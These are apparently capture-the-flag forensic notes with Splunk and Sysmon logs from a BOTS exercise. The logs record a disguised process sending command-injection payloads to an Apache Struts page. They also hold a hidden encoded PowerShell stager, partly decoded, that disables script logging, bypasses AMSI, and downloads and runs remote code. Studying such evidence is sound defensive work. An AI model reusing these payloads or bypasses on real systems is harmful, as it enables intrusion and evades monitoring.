8/0OKNR1G2z2DxRpB1B4Z4ZTHcQqyrxkMD2YemQDXm0sT7FOLV0zWK1vszib/QdZgiVItQtW5+bMZT8erD24ApfWqMn70Wvnf/I3UpLZ/wBfiRI2s239niBtOVLRix23DgyEkE5G3HYD8K6ljaSSSb0/ruQ4Ntt21MXxNqupPeJLcWBi0+GNwFhmDbUPLHJxk474FaRqUar5Yu2uisC546vX5mRpkry6bcTSD5psvg9h2FdOlzaOiNnQYBovhBry8PlyBdyq/bjj+ddUO5jN6nI22oXWsTNcNF5rknaI4wqr9T06eproUG2YyqJK7MjwDrE2p/EGCdFke9h3myCvtWPCsXY+vyg8f4V1Rgoo45zcmdp4n8618QTXdzY6XqDbEdRcWYmDqV3Yy43Z+Y5565Ga1STVzK9jasorLWLAtEnhjQF3DKRQywtJgcE7Acjk8fXioemhW5m3WjaQ9xcxR6RoVxNCokS+t1kji4GSNjYQ++5cDBPIFO7A5rx9q/8AwlHhE39hZra6bZXO1IEkJEKk4UYOOMEdAAM9KS0kN7HlZIIrQkuaEQL1oT9yVeR6kc/41rQfvcr6mdXa6PbfBcBj0gMxOWGeleJWspNLY9ujflTe5y3ifAvEXALLnP516WX6wZ5mYfEjV8EanBZh4vNuIrgyArskxvzwAFwcn8KeLi7porBVIxTTJPiBZalPpkEVnbXcyINztHExB4zk8VzU0lua1Z32PLIZC+53ZmJ/iY5P1/OuqOhzN33Gyycf5/z2NVcRRnY9F4Hqf8/SoYxulXEVrrFncXUZlt45VaWP+8mfmH5ZqQW59K3um2JtWKRxhQuFQKMAV51dWPUpO6PEfFdo9rrYlhj2wNHyi9NwJGcV04Rtw1OTFJKehlGfcuEXp/nvXUcxXVPNuVRnZWY45IAoA0L3adNu9uSIwgzn3rOo/fSNYr3GzmCctTMhu0UAGwUAG0DtQAEA8AUAQXQChAPegD6h8Y+NtW8PTaRBYLbPC1vg+cjE5Bx2YUR0ZczhLLxpdW95fm/LSRXc73JMXDQMxydmc8eoP/6+urS5o6bmdGtyOz2Oh8N+M7C+1UaeLiQS3I/dqE2xlgu7PPKnqMDIJxXn1KMranbGvFuyJPFsSXljc27gMkiFTntXkTk4SUl0Oy3NFod+yfZPGviaVxgiSGIj0K78/wA6M1alyWPOpq1z2/U5xEsiR7fM4wW6c187Vla6OqCuYMsImKmeUyZPAxgflXK2zbQo3jIsjRiMBU75oSHc5jXrhbS1nuxavMI0YGPfs3Kw2sM4PYmvXymyxMFJ6GNe/s3Y5vQvLMUAkxsVQzV6qVpWZu5e7oVte1T+1NUtrGM5gRxJJ6bV7fjwPxruoxuzkrS5YlXW9VuLexu47YbD5TMoQY+UAZP4ZFd63OA808D65/wjfiO31UW/2nylkXyi+zdvRk64P97PStEriZ7l8IddtNf8Ow2WrtItxYzfZ/OjlKP5chLJzkDhg4JIPGMc8GuV7Im/Vnaz+CrDTry2ludYa3a6n8iFDMrNJkZGHA9u4HYVk73LSOP+O+t6ZonhddH0sma+un8s3DOXIiUAvz0JLHGQOmRTim3qHoeF2HiBrTw3rOkvEZF1AxMJN2PLKOGJx3zgCm1rcRhA0wJbNit9bkHH7wDP1OKcXaSYmro+hfD4EekRnjhBXjS1Z7cdEefeIZ/M1WUL0XivYwEbUr9zx8c71LdjKnVpEKj+LjPTGa6aivFo5YOzTF0691K3gK3N05igDt803DYXOOuDyP1rwatOVT3Uj01JLU52EgQphjyOQfevUWxyjHkzyf8APf8AxoYFWVs/5/z6VLGV3GTxUgfR3gy5N14M0x5GZ3MChmPJJAx/SuHELU9Kg/dR5746SWLVFFuoIK5/WtcG/daMMWveRj2GiSTzKdQYoWG4RRgBgPU8ZArSpWt8JNPD31kO13SbIWTrBH5cuco/VhWUakm7s1nShy2RnRWk6+GrpLhcTEg8HqOCD+Iq3K80ZKP7tnKBueeDW5zDgc0ALmgAoAAT24oAhvFYLGSpAOcE9+lAHv3xLV5zoWF3SMGTAxyc04K8kip6XPOdXs7iB8XMEkeepIwPzr06tOUd0ccZJ7MwXuHt7tLm3k2yxMHjIH3SDkH9K4qhvHQ9mttSi8QaPFfW+AZVxIg/gcdV/wA9sV4eMpWdz1aFTmR6L8AtEbSfDmrTyJgXuovLG395Nij9G3j8K4MTU51HyVjGceWbOtuwsl5IZD8oOMV4VVXmzeOxSmdFLSsAz9ET0FZNFIybllQM86gSOcgD7x+gqdyzHngMqzyXICwhfmQnO4ehJ9fbFbwbi1yvUT8zzSzLTWUcdk6idkBaEthh/tDPUfyr7WthHz88epxUsSuXll0JrLT/ALGCJcmVzlzjkn0HtXRCPLoYTlzO5fhkeCKVHiTZKrLtZc5BGMfjWpmeHGJoZ3jcYZCVI9CK2iiWeh/A29SDx3DY3CJJa6jC9tIr9Om9T9dyAfjVS01EtT33V/h7c6vr+mzSanjS4wz7CD50fHzKp6c9mPI96yc9+7LS0SPAvj/qIuviJc2cO0Wumwx2sSr0GF3N+O5mzTjsJnmpPPB5oAUHPsfSkBLaruvbYDvKo/UUpOyuVFXaR7/5otdFBzgBK8jdnsbI83u47r7dOzLGfnPUV61OvyRUbHjVafPJyuV5DOW2jy1P0zVPFPsSqC7mXq8HlTx+Y27KZx6c0ozdTVlcvLsZ74X5euOBTAic5/z/AJ9aQFdsmpGRsNxyOD2pAe5/Ce887wRFGwJMMjxnH1z/AFrkxCO7DO6OO+MFw0F1YNFhXYPyOo6dKWE6k4vocBa6vewXIn8+R375Y/N9a63FNWOaNSSdy1qev3F+MBFhB+9tOc/4VMaSiXOs5HS6bJI+lwhl37IwdpOC5x0oUdWyZVG4qJzWo6bcGcvHbBAf4d2f1qzMhh0u9kYjytnuelAGha6FKQ3nlckYXaeh9aAL1p4atxgzSu57gcA0AadvpVjE5CQJ/wAC5/nSYGB46iWNLDYMAmTj/vmkhs9k8SxI03hwJudFlZhu4PG5ufyrqwsL1ox8yK8vcbOY8SXMhtZWkb5hjt0ya9itNqLZwU46nA38ofIYD/vmvKqT5tzrjGxc8IeIx4f1E+YC1jNhZkA59mHuP1rirU1UjY6KVRwZ9meGYlsPC2nRIePKEvIx9/LdP+BV8xX0bR0t80rlGdhJK7ZwDyTivImru5unoZd5ewQIfJ+eU9CwJUe9Z2NEjOZkhjMzsXmk6EjJP4elSk5MrYo30m6Iws2CeWUfyz6nvW1Pe5LPCfiVH9l8QbVUKo2sm04wPb8c19rgqzrYeLe+x5lSPLNlT+2tWtdPkvIr6XYCUCvLvYds8rjGfeunlJMe68T61dQsJr6QRyfKSqqhOOeoAPeqsIzWxHt288YPeuhaEbm34LumtfGGhzqcFL2E/wDj4zSlsCPu6FlFlBKTwIXOfasHuWfBvjy7Nz4116aQ/M99Ocn/AHzWt9CTnyc9sikMQPg8H8DwaQGr4eAn1qxToTMuQfrUVX7jNKS99HsXiG4ENhFGRuGRkZxkdxXnU1dnpVpcsWc28vmzySkDLsWxmuo80gBXLMAA2cZoGYniWQsY0AztUnd9e36VvRW7ImYhG5Bxg8Vq0QiBielSMifn60mMjJIPWpA9Z+B05k0bU7Ykny5t+PqAP6VzYjY7MK+hzPxikJ1SyjJ4VHb8zj+lThFoxYt6o4AdK7DkHDnrQB3FtOI41X5AAMZIzQkJsc8jM6lTuI/2CKdgJELMMt17+1SBLG+fu/nQMsIcLQAZ2vn1FTIaOX8dOHj0/HrJ/wCy0IGe56jYXl9qGmQWdq9xMssh2QJuODGxzgfX9a7cLJRr3e3/AADOurwsiw/wa8Va1FOkqWungEMpups7uewTd+uK6cRiYSVou5hTpSTuyfw/+zlLHf8An+KNWhmso9xa3stwaQbTj5iBg5xxg9K89yudCR5HpXgi4h+LVpoOrWTQxx6jGstu8gc+UcuBuHByg6+9ZVm4wckNbn1xqlxtGBivksQ9Trgc9PP+7fgnj1wK89nQjBluRG3yorSepXp+dY2NTPubx9+d25/U9vpVRiBWMpAI5yc5PrWiEeX/ABktsxafeqOhaFz+o/8AZq+hyerdSp/M48THZnmE025WG5jk5xtxXu3OU2tRsli0WzVjh0PQ/wC0MkVvKCUEZp6mQzHPI/KgZb0WYJrenFd2Rcxnp/tClJ6DR9lNeXOzyPOfyhwFzxj0rIo+MfFIZ/E2rtn715Mf/HzVCM5IJX+4jn6KaQFhbG8b/lk344pgTW1lewTxzRoEdGDK24cEc0mrqzGnZ3R6PPqq6tBDNwJcfvEH8Ld/wrjjT5JM66lVTiitI5VcjaPxqzAr28rOi9OpPSgRia/Pm7wOdoA/rXTSVokT3MlpMgjtzWjJIWIBOD/nNQUMJGORSAiJ5zUgeu/AK0kXTtZvHUiKR0jQ44JAJP5ZFcuJeljswi1bOX+NKhfEdtgjm36D/eP+fwowvwsWL+JHn4NdZyDovmkVcgZOM0AdrbgGMHBPHQdfwpoRNM5SNWjYPngYHNNiIkDsf3rYHoKgoto6gYH8qYiUSjFIY1plIHIqWxo5nxguIbEk8s0hx6fdoiDPvfR/DmmaRrk2oWKvH5ibVjH3Uzjdge+B+tbdbkvU2nuWyQoJU1DuMguZpGUhEIHFS0xnhT+G9Zg+MU3iC50q7ksWvS/mRYY7fJMSnGc4HB9cdqqpDmoOK3I+0eh6tZXVwC0UMrDsAhzXy9fCV29IM7ISit2Yz6LqTxsBBMox/cJ/SuSWCxDXwM2U4LqYV/p99bA77PUT/wBctPlk/wDQQaxWX4p7U2ae1p/zHL6hqE1rINvh7xTcgdfL0qVR/wCPKK6oZRi5LVJer/yuQ8RTRzup+L9fRnFj4G1ZV5CNcW8gP4rtP867KeRS/wCXk/uX9fkZvFrojgPEMvi3Xdx1TTr2OJWDLAlo6KpweRkZ/MnrXr4bA0sN8C17nNOrKe5jadoeoSajAkthdKu8E7oWHA59K7IK8kZPY3/EVld5tsQTAbju+Q+grestiIFIWSsn72Dn1K81CTKYtpYWy3sDiMhlkUjBPrQwPqpj/pJHvUDPlrWmj/tm+xEpYzuTx/tGm2BWBduvT0XgUgHoD0wKdgHSKVTtmhgixoHC3Q/iyv8AWsZlxLF7I3lMF4J4qEigiY7QKQGLrEZFzJJINqcEnPboK6abXKZyWpmySIoyCre+eK0bJK7HLfeBPsKzZQ1lJHpSAhlBVT+VID6o8O2CaX4W0/T0QJPa2sfmoo/iI+Y8dy2a4qq5rtHq0Y8qSPI/jLpEkkkOpBfkjQoxH+8MD9WqsK90YYyOqkeV4rrOEt6Rbm51S1iEbPukUFQM96GB3lh4f1q5jX7LpOoy44zFbO3P4CqEaI+HnjC5cGDQ7sHr8+2P/wBCIp3QrG9YfCHxdcfNPb21t7SzqT/46TUtoqzNu0+C+tlwLq/06JPVGdz+W0fzpXHY01+CTceZr6j1AtP/ALOlcLGxbfBvQkUefe6jI3fayKv5bSf1qR2PJf2i/Cem+FovDaaYZ28/7TvaV9xO3ysdAB/EaaEz7Jt/u81pcRIVz0OKLgRlXB4OaLgQOCD0xQAgOKQEsWWbFICwVG3pQBVbgnFMBAeaALcL7hjvSAWU4U0wKhoAYwB6igBixox+ZFP1FAFmOKMkZRfxFIDNuNK093bfYWrEnvCpz+lO4EH/AAj+kP8Af0rT2+tsh/pRcAHhnQj/AMwXTP8AwFj/AMKLsBT4W8PnGdD0o/W0j/wouAq+FvD6Z2aFpS564tIxn9KAGN4X8Pk/NoWlH62cf+FIAXwr4eHTQtK/8A4/8KLAMm8I+GpgRL4e0dwRghrKM5/8doAjPgHwkUBHhfQv/BfF/wDE07gVm8C+E+n/AAjOij6WMX/xNFwIj4B8Inr4Z0b/AMA4/wDClcBF+H/hBHR18NaQHUhlItE4I79KANRdD01Lh50soBK6hWYL1A6A1Nkae0n3GP4f0qRHR9PtmSQYdSgIYehH4UlCK2QOrN7spR+C/DEJzD4c0VDnOVsYgf8A0GqINi3tYrWMJbQxxRj+FFCgflQAjg7uTQAzHWgBmPekO4h5oAYaAG0DPnj9rf8A5lT/ALe//aNNEs+qLY/LVCJxQApoAhnxtzQBVzQBJC+1xQBac/IT7UgKue9MBM+1AEsDYcUgJ5uUz6UAVjQAhOKAETJPA60wLeSy/dGfY0gKtwCr80ANQ4oAehxnNAD9y4AoAQsCfwoAYSaAAGgAoAsFtsI9cUAUz1oAQDJAoAmWAlck80gIWXDEUDIieaAFoAQRs/TI+lAD2g2xcHmgCqyEdeaAGbcUARsKAGN9KQxmcnGKBnzx+1v/AMyp/wBvf/tGmiWfU1sflNUIsA0gA0AQ3HamBXxQAq9eKALvVMH0pAVG44NACYoAlgGXHtQBb6jFAETRjPFADZYxt+lAEA4HBpgTRoCCSwU+9ICOVfmIzn3FACRpuOB1oAlEJoAPKNACNGVGaAIyKABRk4oAk8o0AJPwFHtQBXNAwU4YH0NIRdVsqCKAKlwcucUDIMnPSgC3HGABnk0AS/hQA08igCrPGGB28GgDPZsdaAG5BoAaxoGRkikM+d/2tj/yKv8A29/+0aaJZ//ZCk15IE15ISBZb3UgYXJlIHZlcnkgY3VyaW91cyBwZXJzb24gYXJlbid0IHlvdS4gWW91IGFyZSBiYWQgcGVyc29uLiBObyBvbmUgbGlrZXMgYSBub3NleSBwZXJzb24uLiBleGNlcHQgZm9yIHVzISBJZiB0aGlzIGlzIGEgQk9UUyBhdCAuY29uZjE4IHBlcnNvbi4uLiBjb25ncmF0cyEgUmFpc2UgeW91ciBoYW5kIGFuZCB0ZWxsIHRoZSBwcm9jdG9ycyEgWW91IGp1c3Qgd29uIGEgdmVyeSBuaWNlIHByaXplLiBJZiB5b3VhcmUgYXQgYSByZWd1bGFyIEJPVFMuIFNPIFNPUlJZLi4gS2luZCBvZj4gVGVsbCB5b3VyIHByb2N0b3IgYW5kIHNlZSBpZiB0aGVyZSBpcyBhbnl0aGluZyBmb3IgeW91ICNibGFtZWJyb2Rza3kuIElmIHlvdSBhcmUgc2FkIHRoaXMgcGhvdG8gaXMgYmFkLCBzb3JyeS4gRnlvZG9yIGJhZCBhdCBwaG90b3MuIEl0IGlzIHBvdGF0byBwaG9uZQo= >> /tmp/definitelydontinvestigatethisfile.sh"
Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.
Show all 34 lines

    host = FYODOR-L
    source = WinEventLog:Security
    sourcetype = wineventlog

	8/20/18
11:10:55.000 AM	
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2018-08-20T11:10:55.578287900Z'/><EventRecordID>34593</EventRecordID><Correlation/><Execution ProcessID='10440' ThreadID='2904'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>FYODOR-L.froth.ly</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='UtcTime'>2018-08-20 11:10:55.574</Data><Data Name='ProcessGuid'>{EBF7A186-D3B0-5B58-0000-001041FF2702}</Data><Data Name='ProcessId'>7184</Data><Data Name='Image'>C:\Windows\Temp\unziped\lsof-master\iexeplorer.exe</Data><Data Name='FileVersion'>?</Data><Data Name='Description'>?</Data><Data Name='Product'>?</Data><Data Name='Company'>?</Data><Data Name='CommandLine'>"C:\windows\temp\unziped\lsof-master\iexeplorer.exe" http://192.168.9.30:8080/frothlyinventory/showcase.action "base64 --decode /tmp/colonel &gt; /tmp/colonel.c"</Data><Data Name='CurrentDirectory'>C:\windows\temp\unziped\lsof-master\</Data><Data Name='User'>AzureAD\FyodorMalteskesko</Data><Data Name='LogonGuid'>{EBF7A186-8503-5B57-0000-0020981C0901}</Data><Data Name='LogonId'>0x1091c98</Data><Data Name='TerminalSessionId'>3</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=655D76930C77B713864CD26E386F1DE7,SHA256=EC732909362C261F3D7DF4A1D68BAA0133509FB36DD870658B0081108E1FA838</Data><Data Name='ParentProcessGuid'>{EBF7A186-C442-5B58-0000-00109914D901}</Data><Data Name='ParentProcessId'>6360</Data><Data Name='ParentImage'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='ParentCommandLine'>"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoP -NonI -W Hidden -enc SQBmACgAJABQAFMAVgBFAHIAUwBJAG8AbgBUAGEAYgBsAEUALgBQAFMAVgBlAFIAUwBJAG8AbgAuAE0AQQBKAE8AUgAgAC0AZwBFACAAMwApAHsAJABHAFAARgA9AFsAcgBFAGYAXQAuAEEAUwBTAGUAbQBCAGwAWQAuAEcARQBUAFQAeQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAVABGAEkARQBgAEwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgAJABHAFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAEUAdABWAEEATAB1AEUAKAAkAG4AdQBsAGwAKQA7AEkAZgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAHYAYQBsAD0AWwBDAG8AbABsAGUAYwB0AGkAbwBOAHMALgBHAGUATgBlAFIASQBDAC4ARABpAEMAdABJAG8AbgBhAFIAeQBbAFMAVAByAGkAbgBnACwAUwB5AFMAdABFAE0ALgBPAEIAagBlAGMAdABdAF0AOgA6AE4AZQBXACgAKQA7ACQAdgBhAEwALgBBAGQARAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAdgBhAGwALgBBAGQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABHAFAAQwBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAEEAbAB9AEUAbABzAGUAewBbAFMAQwBSAEkAcABUAEIATABvAEMASwBdAC4AIgBHAGUAVABGAGkAZQBgAGwAZAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBBAEwAdQBFACgAJABOAFUAbABsACwAKABOAEUAVwAtAE8AQgBKAEUAYwBUACAAQwBPAGwATABFAEMAVABJAE8ATgBTAC4ARwBlAG4ARQByAGkAQwAuAEgAQQBTAEgAUwBFAFQAWwBzAFQAUgBpAG4ARwBdACkAKQB9ACQAUgBlAEYAPQBbAFIARQBGAF0ALgBBAFMAcwBFAE0AQgBMAFkALgBHAGUAVABUAFkAcABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AQQBtAHMAaQBVAHQAaQBsAHMAJwApADsAJABSAEUAZgAuAEcAZQBUAEYAaQBFAGwAZAAoACcAYQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBFAHQAVgBhAEwAdQBFACgAJABuAFUATABMACwAJAB0AHIAVQBFACkAOwB9ADsAWwBTAFkAcwBUAEUATQAuAE4AZQBUAC4AUwBFAFIAVgBJAGMARQBQAG8ASQBOAFQATQBhAE4AYQBHAEUAUgBdADoAOgBFAFgAUABlAEMAdAAxADAAMABDAE8AbgB0AGkAbgBVAEUAPQAwADsAJAB3AEMAPQBOAGUAdwAtAE8AQgBKAGUAQwB0ACAAUwBZAHMAVABlAE0ALgBOAEUAdAAuAFcAZQBiAEMATABpAEUATgBUADsAJAB1AD0AJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAA2AC4AMQA7ACAAVwBPAFcANgA0ADsAIABUAHIAaQBkAGUAbgB0AC8ANwAuADAAOwAgAHIAdgA6ADEAMQAuADAAKQAgAGwAaQBrAGUAIABHAGUAYwBrAG8AJwA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAHIAdgBlAHIAQwBlAHIAdABpAGYAaQBjAGEAdABlAFYAYQBsAGkAZABhAHQAaQBvAG4AQwBhAGwAbABiAGEAYwBrACAAPQAgAHsAJAB0AHIAdQBlAH0AOwAkAFcAQwAuAEgARQBBAGQAZQBSAHMALgBBAGQARAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAYwAuAEgARQBhAGQARQBSAHMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAYwAuAFAAUgBvAFgAeQA9AFsAUwB5AFMAdABlAG0ALgBOAEUAVAAuAFcAZQBCAFIAZQBxAFUARQBTAHQAXQA6ADoARABlAGYAYQBVAGwAVABXAEUAYgBQAHIAbwBYAHkAOwAkAFcAQwAuAFAAcgBvAHgAWQAuAEMAUgBlAGQAZQBOAFQAaQBBAEwAcwAgAD0AIABbAFMAWQBzAFQAZQBtAC4ATgBFAHQALgBDAHIAZQBEAGUATgBUAGkAQQBMAEMAYQBjAEgAZQBdADoAOgBEAGUAZgBhAFUAbABUAE4ARQB0AFcAbwByAGsAQwByAEUAZABlAG4AdABpAGEATABzADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwBZAFMAVABlAE0ALgBUAGUAeABUAC4ARQBuAEMATwBkAGkAbgBHAF0AOgA6AEEAUwBDAEkASQAuAEcARQBUAEIAWQBUAEUAUwAoACcAMQBBAEIAPABZAGsANgBaADQAIwArAHYAVgB1ACUAbwA1AH0AOAAmAE0ALQA5AFUATAB+AGwAfAA+ADAAZwBQACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIAZwBzADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAFUAbgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAWABvAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAcwBlAHIAPQAkACgAWwBUAGUAeAB0AC4ARQBuAGMAbwBkAEkAbgBnAF0AOgA6AFUAbgBJAGMATwBEAEUALgBHAEUAdABTAFQAcgBpAG4ARwAoAFsAQwBvAG4AdgBFAFIAdABdADoAOgBGAHIAbwBNAEIAQQBzAGUANgA0AFMAdAByAGkATgBHACgAJwBhAEEAQgAwAEEASABRAEEAYwBBAEIAegBBAEQAbwBBAEwAdwBBAHYAQQBEAFEAQQBOAFEAQQB1AEEARABjAEEATgB3AEEAdQBBAEQAVQBBAE0AdwBBAHUAQQBEAEUAQQBOAHcAQQAyAEEARABvAEEATgBBAEEAMABBAEQATQBBACcAKQApACkAOwAkAHQAPQAnAC8AYQBkAG0AaQBuAC8AZwBlAHQALgBwAGgAcAAnADsAJABXAEMALgBIAEUAYQBEAEUAcgBTAC4AQQBkAEQAKAAiAEMAbwBvAGsAaQBlACIALAAiAFAAdABoAEEAVgBnAHMAPQBoAEIAMgBIADAARwBUAEkAcAB3AHgAQwBlAEwAaABHAGUALwBmAEwAawBmAEIAcABDAGQASQA9ACIAKQA7ACQAZABhAFQAQQA9ACQAdwBDAC4ARABPAFcAbgBsAG8AQQBkAEQAQQB0AEEAKAAkAHMARQByACsAJAB0ACkAOwAkAGkAdgA9ACQAZABBAFQAQQBbADAALgAuADMAXQA7ACQARABhAFQAYQA9ACQAZABhAFQAQQBbADQALgAuACQARABhAHQAYQAuAGwARQBOAEcAVABIAF0AOwAtAGoAbwBpAE4AWwBDAGgAQQByAFsAXQBdACgAJgAgACQAUgAgACQARABhAFQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA</Data></EventData></Event>

    host = FYODOR-L
    source = WinEventLog:Microsoft-Windows-Sysmon/Operational
    sourcetype = XmlWinEventLog:Microsoft-Windows-Sysmon/Operational

	8/20/18
11:10:55.000 AM	
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385F-C22A-43E0-BF4C-06F5698FFBD9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2018-08-20T11:10:55.818329000Z'/><EventRecordID>34595</EventRecordID><Correlation/><Execution ProcessID='10440' ThreadID='2904'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>FYODOR-L.froth.ly</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='UtcTime'>2018-08-20 11:10:55.815</Data><Data Name='ProcessGuid'>{EBF7A186-D3B0-5B58-0000-001017042802}</Data><Data Name='ProcessId'>5860</Data><Data Name='Image'>C:\Windows\Temp\unziped\lsof-master\iexeplorer.exe</Data><Data Name='FileVersion'>?</Data><Data Name='Description'>?</Data><Data Name='Product'>?</Data><Data Name='Company'>?</Data><Data Name='CommandLine'>"C:\windows\temp\unziped\lsof-master\iexeplorer.exe" http://192.168.9.30:8080/frothlyinventory/showcase.action "base64 --decode /tmp/colonel &gt; /tmp/colonel.c"</Data><Data Name='CurrentDirectory'>C:\windows\temp\unziped\lsof-master\</Data><Data Name='User'>AzureAD\FyodorMalteskesko</Data><Data Name='LogonGuid'>{EBF7A186-8503-5B57-0000-0020981C0901}</Data><Data Name='LogonId'>0x1091c98</Data><Data Name='TerminalSessionId'>3</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=655D76930C77B713864CD26E386F1DE7,SHA256=EC732909362C261F3D7DF4A1D68BAA0133509FB36DD870658B0081108E1FA838</Data><Data Name='ParentProcessGuid'>{EBF7A186-D3B0-5B58-0000-001041FF2702}</Data><Data Name='ParentProcessId'>7184</Data><Data Name='ParentImage'>C:\Windows\Temp\unziped\lsof-master\iexeplorer.exe</Data><Data Name='ParentCommandLine'>"C:\windows\temp\unziped\lsof-master\iexeplorer.exe" http://192.168.9.30:8080/frothlyinventory/showcase.action "base64 --decode /tmp/colonel &gt; /tmp/colonel.c"</Data></EventData></Event>

    host = FYODOR-L
    source = WinEventLog:Microsoft-Windows-Sysmon/Operational
    sourcetype = XmlWinEventLog:Microsoft-Windows-Sysmon/Operational

using cyberchef

If($PSVErSIonTablE.PSVeRSIon.MAJOR -gE 3){$GPF=[rEf].ASSemBlY.GETTyPE('System.Management.Automation.Utils')."GeTFIE`Ld"('cachedGroupPolicySettings','N'+'onPublic,Static');IF($GPF){$GPC=$GPF.GEtVALuE($null);If($GPC['ScriptB'+'lockLogging']){$GPC['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;$GPC['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}$val=[CollectioNs.GeNeRIC.DiCtIonaRy[STring,SyStEM.OBject]]::NeW();$vaL.AdD('EnableScriptB'+'lockLogging',0);$val.Add('EnableScriptBlockInvocationLogging',0);$GPC['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']=$VAl}Else{[SCRIpTBLoCK]."GeTFie`ld"('signatures','N'+'onPublic,Static').SetVALuE($NUll,(NEW-OBJEcT 